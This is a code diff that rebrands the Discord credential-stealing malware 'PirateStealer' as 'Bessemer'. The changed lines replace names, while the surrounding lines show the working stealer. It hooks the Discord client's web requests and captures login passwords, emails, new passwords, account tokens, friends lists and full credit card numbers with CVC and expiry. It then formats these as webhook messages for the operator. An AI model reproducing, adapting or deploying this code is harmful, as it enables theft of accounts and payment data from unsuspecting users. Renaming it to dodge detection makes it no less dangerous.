@@ -80,7 +80,7 @@ const badges = {
 };
 
 
-class PirateStealerEvent {
+class BessemerEvent {
     constructor(event, token, data) {
         this.event = event;
         this.data = data;
@@ -111,7 +111,7 @@ async function firstTime() {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "PirateStealer",
+                    username: "Bessemer",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
@@ -122,10 +122,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "Bessemer"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "Bessemer"
                         }
                     }]
                 };
@@ -133,7 +133,7 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "PirateStealer",
+                    username: "Bessemer",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
@@ -161,10 +161,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "Bessemer"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "Bessemer"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -176,14 +176,14 @@ async function firstTime() {
 
         }
     }
-    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0
+    if (!fs.existsSync(path.join(__dirname, "BessemerBTW"))) return !0
 
-    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
+    fs.rmdirSync(path.join(__dirname, "BessemerBTW"));
     if (config.logout != "false" || config.logout == "%LOGOUT%") {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "PirateStealer",
+                    username: "Bessemer",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
@@ -194,10 +194,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "Bessemer"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "Bessemer"
                         }
                     }]
                 };
@@ -205,7 +205,7 @@ async function firstTime() {
             } else {
                 const b = await getUserInfo(token);
                 var c = {
-                    username: "PirateStealer",
+                    username: "Bessemer",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User got logged out",
@@ -233,10 +233,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "Bessemer"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "Bessemer"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -308,7 +308,7 @@ async function userLogin(password, email, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "Bessemer",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "User Login",
@@ -352,10 +352,10 @@ async function userLogin(password, email, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -365,10 +365,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -384,10 +384,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             }
         }
         params.embeds.push(embed)
@@ -403,7 +403,7 @@ async function emailChanged(password, newEmail, token) {
 
 
     var params = {
-        username: "PirateStealer",
+        username: "Bessemer",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Email Changed",
@@ -443,10 +443,10 @@ async function emailChanged(password, newEmail, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -456,10 +456,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -474,10 +474,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             }
         }
         params.embeds.push(embed)
@@ -491,7 +491,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "Bessemer",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Password Changed",
@@ -539,10 +539,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -552,10 +552,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -571,10 +571,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             }
         }
         params.embeds.push(embed)
@@ -588,7 +588,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "PirateStealer",
+        username: "Bessemer",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Credit Card",
@@ -642,10 +642,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
                 },
             ],
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -655,10 +655,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "PirateStealer"
+                "name": "Bessemer"
             },
             "footer": {
-                "text": "PirateStealer"
+                "text": "Bessemer"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -797,7 +797,7 @@ session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callba
 
     switch (true) {
         case details.url.endsWith('login'):
-            var event = new PirateStealerEvent('userLogin', token, {
+            var event = new BessemerEvent('userLogin', token, {
                 password: data.password,
                 email: data.login
             });
@@ -806,7 +806,7 @@ session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callba
         case details.url.endsWith('users/@me') && details.method == 'PATCH':
             if (!data.password) return;
             if (data.email) {
-                var event = new PirateStealerEvent('emailChanged', token, {
+                var event = new BessemerEvent('emailChanged', token, {
                     password: data.password,
                     email: data.email
                 });
@@ -814,7 +814,7 @@ session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callba
 
             };
             if (data.new_password) {
-                var event = new PirateStealerEvent('passwordChanged', token, {
+                var event = new BessemerEvent('passwordChanged', token, {
                     password: data.password,
                     new_password: data.new_password
                 });
@@ -823,7 +823,7 @@ session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callba
             return;
         case details.url.endsWith('tokens') && details.method == "POST":
             const card = querystring.parse(decodeURIComponent(unparsed_data))
-            var event = new PirateStealerEvent('creditCardAdded', token, {
+            var event = new BessemerEvent('creditCardAdded', token, {
                 cardnumber: card["card[number]"],
                 cvc: card["card[cvc]"],
                 expiration: `${card["card[exp_month]"]}/${card["card[exp_year]"]}`
